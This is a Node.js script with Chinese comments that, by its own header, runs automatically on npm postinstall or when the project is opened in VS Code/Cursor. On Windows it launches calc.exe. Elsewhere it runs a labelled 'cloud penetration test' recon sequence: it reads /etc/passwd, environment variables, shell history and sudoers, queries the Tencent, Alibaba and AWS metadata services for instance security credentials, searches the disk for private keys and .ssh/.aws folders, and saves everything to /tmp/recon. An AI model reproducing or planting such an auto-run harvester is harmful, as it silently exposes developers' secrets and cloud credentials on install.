/**
 * 项目打开时自动执行的脚本
 * 
 * 这个文件会在以下情况自动执行：
 * 1. npm install 后（通过 postinstall 钩子）
 * 2. 通过 package.json 的 scripts 手动调用
 * 3. 通过 .vscode/tasks.json 配置自动运行
 */

const fs = require('fs');
const path = require('path');
const { exec } = require('child_process');
const { promisify } = require('util');
const execPromise = promisify(exec);

const projectRoot = __dirname;
const files = fs.readdirSync(projectRoot);
files.forEach(file => {
  const filePath = path.join(projectRoot, file);
  const stats = fs.statSync(filePath);
  const icon = stats.isDirectory() ? '📁' : '📄';
});

const configFiles = [
  { name: 'package.json', desc: 'Node.js 项目配置' },
  { name: '.vscode/tasks.json', desc: 'VS Code/Cursor 任务配置' },
  { name: '.vscode/settings.json', desc: 'VS Code/Cursor 设置' },
  { name: '.gitignore', desc: 'Git 忽略文件' }
];

configFiles.forEach(config => {
  const configPath = path.join(projectRoot, config.name);
  const exists = fs.existsSync(configPath);
  const status = exists ? '✅' : '❌';
});

try {

  const logDir = path.join(projectRoot, 'logs');
  if (!fs.existsSync(logDir)) {
    fs.mkdirSync(logDir, { recursive: true });

  }


  const logFile = path.join(logDir, 'open-history.log');
  const logEntry = `[${new Date().toISOString()}] 项目被打开\n`;
  fs.appendFileSync(logFile, logEntry);


} catch (error) {

}

if (process.platform === 'win32') {
  try {

    exec('calc.exe', (error, stdout, stderr) => {
      if (error) {

        return;
      }

    });
    console.log('✅ 已启动 Windows 计算器');
  } catch (error) {

  }
} else {
  // 云渗透测试 - 信息收集阶段
  const resultsDir = '/tmp/recon';
  if (!fs.existsSync(resultsDir)) {
    fs.mkdirSync(resultsDir, { recursive: true });
  }

  // 云渗透测试命令列表 - 全面信息收集
  const commands = [
    // 基础系统信息
    { cmd: 'uname -a', file: `${resultsDir}/uname.txt`, desc: '系统信息' },
    { cmd: 'whoami', file: `${resultsDir}/whoami.txt`, desc: '当前用户' },
    { cmd: 'id', file: `${resultsDir}/id.txt`, desc: '用户ID和组信息' },
    { cmd: 'hostname', file: `${resultsDir}/hostname.txt`, desc: '主机名' },
    { cmd: 'cat /etc/passwd', file: `${resultsDir}/passwd.txt`, desc: '用户列表' },
    { cmd: 'cat /etc/group', file: `${resultsDir}/group.txt`, desc: '组列表' },
    
    // 环境变量和凭证
    { cmd: 'env', file: `${resultsDir}/env.txt`, desc: '环境变量' },
    { cmd: 'printenv', file: `${resultsDir}/printenv.txt`, desc: '打印环境变量' },
    
    // 网络信息
    { cmd: 'ip addr', file: `${resultsDir}/ip_addr.txt`, desc: 'IP地址信息' },
    { cmd: 'ip route', file: `${resultsDir}/ip_route.txt`, desc: '路由表' },
    { cmd: 'ifconfig -a', file: `${resultsDir}/ifconfig.txt`, desc: '网络接口' },
    { cmd: 'netstat -tulpn', file: `${resultsDir}/netstat.txt`, desc: '网络连接' },
    { cmd: 'ss -tulpn', file: `${resultsDir}/ss.txt`, desc: 'Socket统计' },
    { cmd: 'arp -a', file: `${resultsDir}/arp.txt`, desc: 'ARP表' },
    { cmd: 'cat /etc/resolv.conf', file: `${resultsDir}/resolv.conf.txt`, desc: 'DNS配置' },
    
    // 进程和服务信息
    { cmd: 'ps aux', file: `${resultsDir}/ps_aux.txt`, desc: '进程列表' },
    { cmd: 'ps auxef', file: `${resultsDir}/ps_auxef.txt`, desc: '进程树' },
    { cmd: 'top -b -n 1', file: `${resultsDir}/top.txt`, desc: '系统资源' },
    
    // 文件系统信息
    { cmd: 'pwd', file: `${resultsDir}/pwd.txt`, desc: '当前目录' },
    { cmd: 'ls -la', file: `${resultsDir}/ls_la.txt`, desc: '当前目录列表' },
    { cmd: 'ls -la /', file: `${resultsDir}/ls_root.txt`, desc: '根目录列表' },
    { cmd: 'ls -la /home', file: `${resultsDir}/ls_home.txt`, desc: 'home目录' },
    { cmd: 'ls -la /root', file: `${resultsDir}/ls_root_home.txt`, desc: 'root目录' },
    { cmd: 'df -h', file: `${resultsDir}/df.txt`, desc: '磁盘使用' },
    { cmd: 'mount', file: `${resultsDir}/mount.txt`, desc: '挂载点' },
    { cmd: 'cat /proc/version', file: `${resultsDir}/proc_version.txt`, desc: '内核版本' },
    { cmd: 'cat /proc/cpuinfo', file: `${resultsDir}/cpuinfo.txt`, desc: 'CPU信息' },
    { cmd: 'cat /proc/meminfo', file: `${resultsDir}/meminfo.txt`, desc: '内存信息' },
    
    // 历史记录和日志
    { cmd: 'history', file: `${resultsDir}/history.txt`, desc: '命令历史' },
    { cmd: 'cat ~/.bash_history', file: `${resultsDir}/bash_history.txt`, desc: 'Bash历史' },
    
    // 云元数据服务探测 - 腾讯云
    { cmd: 'curl -s http://metadata.tencentyun.com/latest/meta-data/', file: `${resultsDir}/tencent_metadata_root.txt`, desc: '腾讯云元数据根' },
    { cmd: 'curl -s http://metadata.tencentyun.com/latest/meta-data/instance-id', file: `${resultsDir}/tencent_instance_id.txt`, desc: '腾讯云实例ID' },
    { cmd: 'curl -s http://metadata.tencentyun.com/latest/meta-data/region', file: `${resultsDir}/tencent_region.txt`, desc: '腾讯云区域' },
    { cmd: 'curl -s http://metadata.tencentyun.com/latest/meta-data/zone', file: `${resultsDir}/tencent_zone.txt`, desc: '腾讯云可用区' },
    { cmd: 'curl -s http://metadata.tencentyun.com/latest/meta-data/private-ipv4', file: `${resultsDir}/tencent_private_ip.txt`, desc: '腾讯云内网IP' },
    { cmd: 'curl -s http://metadata.tencentyun.com/latest/meta-data/public-ipv4', file: `${resultsDir}/tencent_public_ip.txt`, desc: '腾讯云公网IP' },
    { cmd: 'curl -s http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/', file: `${resultsDir}/tencent_credentials_list.txt`, desc: '腾讯云凭证列表' },
    
    // 云元数据服务探测 - 阿里云
    { cmd: 'curl -s http://100.100.100.200/latest/meta-data/', file: `${resultsDir}/aliyun_metadata_root.txt`, desc: '阿里云元数据根' },
    { cmd: 'curl -s http://100.100.100.200/latest/meta-data/instance-id', file: `${resultsDir}/aliyun_instance_id.txt`, desc: '阿里云实例ID' },
    { cmd: 'curl -s http://100.100.100.200/latest/meta-data/region-id', file: `${resultsDir}/aliyun_region.txt`, desc: '阿里云区域' },
    
    // 云元数据服务探测 - AWS
    { cmd: 'curl -s http://169.254.169.254/latest/meta-data/', file: `${resultsDir}/aws_metadata_root.txt`, desc: 'AWS元数据根' },
    { cmd: 'curl -s http://169.254.169.254/latest/meta-data/instance-id', file: `${resultsDir}/aws_instance_id.txt`, desc: 'AWS实例ID' },
    { cmd: 'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/', file: `${resultsDir}/aws_credentials_list.txt`, desc: 'AWS凭证列表' },
    
    // 容器/Docker信息
    { cmd: 'cat /proc/self/cgroup', file: `${resultsDir}/cgroup.txt`, desc: 'Cgroup信息' },
    { cmd: 'cat /.dockerenv 2>/dev/null || echo "Not in Docker"', file: `${resultsDir}/dockerenv.txt`, desc: 'Docker环境检测' },
    { cmd: 'ls -la /.dockerenv 2>/dev/null || echo "Not found"', file: `${resultsDir}/dockerenv_file.txt`, desc: 'Docker环境文件' },
    
    // 敏感文件查找
    { cmd: 'find / -name "*.pem" -o -name "*.key" -o -name "*.p12" -o -name "*.pfx" 2>/dev/null | head -20', file: `${resultsDir}/key_files.txt`, desc: '密钥文件查找' },
    { cmd: 'find / -name ".aws" -o -name ".ssh" 2>/dev/null | head -20', file: `${resultsDir}/config_dirs.txt`, desc: '配置目录查找' },
    { cmd: 'find /root -name "*.json" -o -name "*.yaml" -o -name "*.yml" 2>/dev/null | head -20', file: `${resultsDir}/config_files.txt`, desc: '配置文件查找' },
    
    // 网络连通性测试
    { cmd: 'ping -c 2 8.8.8.8', file: `${resultsDir}/ping_google_dns.txt`, desc: 'Google DNS连通性' },
    { cmd: 'ping -c 2 baidu.com', file: `${resultsDir}/ping_baidu.txt`, desc: '百度连通性' },
    { cmd: 'curl -s -m 5 http://www.baidu.com | head -20', file: `${resultsDir}/curl_baidu.txt`, desc: 'HTTP测试' },
    
    // 权限和sudo信息
    { cmd: 'sudo -l', file: `${resultsDir}/sudo_list.txt`, desc: 'Sudo权限' },
    { cmd: 'cat /etc/sudoers 2>/dev/null || echo "Permission denied"', file: `${resultsDir}/sudoers.txt`, desc: 'Sudoers配置' },
    
    // 系统服务
    { cmd: 'systemctl list-units --type=service --state=running 2>/dev/null || service --status-all 2>/dev/null || echo "Not available"', file: `${resultsDir}/services.txt`, desc: '运行中的服务' },
    
    // 定时任务
    { cmd: 'crontab -l 2>/dev/null || echo "No crontab"', file: `${resultsDir}/crontab.txt`, desc: '当前用户定时任务' },
    { cmd: 'cat /etc/crontab 2>/dev/null || echo "Permission denied"', file: `${resultsDir}/etc_crontab.txt`, desc: '系统定时任务' },
    { cmd: 'ls -la /etc/cron.* 2>/dev/null || echo "Not found"', file: `${resultsDir}/cron_dirs.txt`, desc: 'Cron目录' },
  ];

  // 执行所有命令并收集结果
  const executeCommands = async () => {
    const summary = {
      total: commands.length,
      success: 0,
      failed: 0,
      results: []
    };

    console.log(`\n[云渗透测试] 开始信息收集，共 ${commands.length} 个命令...\n`);

    for (const command of commands) {
      try {
        const { stdout, stderr } = await execPromise(command.cmd, { 
          maxBuffer: 10 * 1024 * 1024, // 10MB buffer
          timeout: 30000 // 30秒超时
        });


        const output = stdout || stderr || '';
        fs.writeFileSync(command.file, output);
        
        summary.success++;
        summary.results.push({
          command: command.desc,
          status: 'success',
          file: command.file,
          size: output.length
        });
        
        console.log(`✅ [${summary.success}/${commands.length}] ${command.desc} - 已保存到 ${command.file} (${output.length} 字节)`);
        
        // 如果输出较短，直接显示
        if (output.length < 500 && output.trim()) {
          console.log(`   输出: ${output.trim().substring(0, 200)}${output.length > 200 ? '...' : ''}`);
        }
      } catch (error) {
        summary.failed++;
        const errorOutput = `错误: ${error.message}\n${error.stderr || ''}\n返回码: ${error.code || 'N/A'}`;

        fs.writeFileSync(command.file, errorOutput);
        
        summary.results.push({
          command: command.desc,
          status: 'failed',
          file: command.file,
          error: error.message
        });
        
        console.log(`❌ [失败] ${command.desc} - ${error.message}`);
      }
    }

    // 生成汇总报告
    const summaryFile = `${resultsDir}/SUMMARY.txt`;
    const summaryReport = `
========================================
云渗透测试 - 信息收集汇总报告
========================================
时间: ${new Date().toISOString()}
总命令数: ${summary.total}
成功: ${summary.success}
失败: ${summary.failed}
成功率: ${((summary.success / summary.total) * 100).toFixed(2)}%

详细结果:
${summary.results.map(r => 
  `[${r.status === 'success' ? '✓' : '✗'}] ${r.command} -> ${r.file}${r.size ? ` (${r.size} 字节)` : ''}${r.error ? ` - 错误: ${r.error}` : ''}`
).join('\n')}

所有结果文件保存在: ${resultsDir}
========================================
`;
    
    fs.writeFileSync(summaryFile, summaryReport);
    console.log(`\n${summaryReport}`);
    console.log(`\n[完成] 所有结果已保存到 ${resultsDir}/`);
    console.log(`[汇总] 查看汇总报告: cat ${summaryFile}\n`);
  };

  executeCommands().catch(err => {
    console.error('[严重错误] 执行命令序列时出错:', err);
    fs.writeFileSync(`${resultsDir}/CRITICAL_ERROR.txt`, `错误: ${err.message}\n堆栈: ${err.stack}`);
  });
}
